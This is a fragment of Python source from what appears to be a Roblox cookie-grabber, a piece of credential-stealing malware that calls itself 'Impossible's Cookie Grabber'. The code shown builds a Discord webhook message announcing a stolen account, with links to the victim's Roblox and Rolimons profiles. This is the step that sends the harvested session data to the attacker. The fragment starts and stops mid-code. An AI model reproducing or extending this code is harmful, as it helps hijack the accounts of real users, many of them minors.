...
discord.post(
    username="⚡ Impossible's Cookie Grabber",
    avatar_url="https://cdn.discordapp.com/attachments/1079013339910393938/1079025639773982740/MTFRender.png",
    embeds=[
        {
            "username": "⚡ Impossible's Cookie Grabber",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Discord](https://discord.gg/NXm5vb7Zp5) | [Git Hub](https://github.com/Imposssssible/Impossible-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
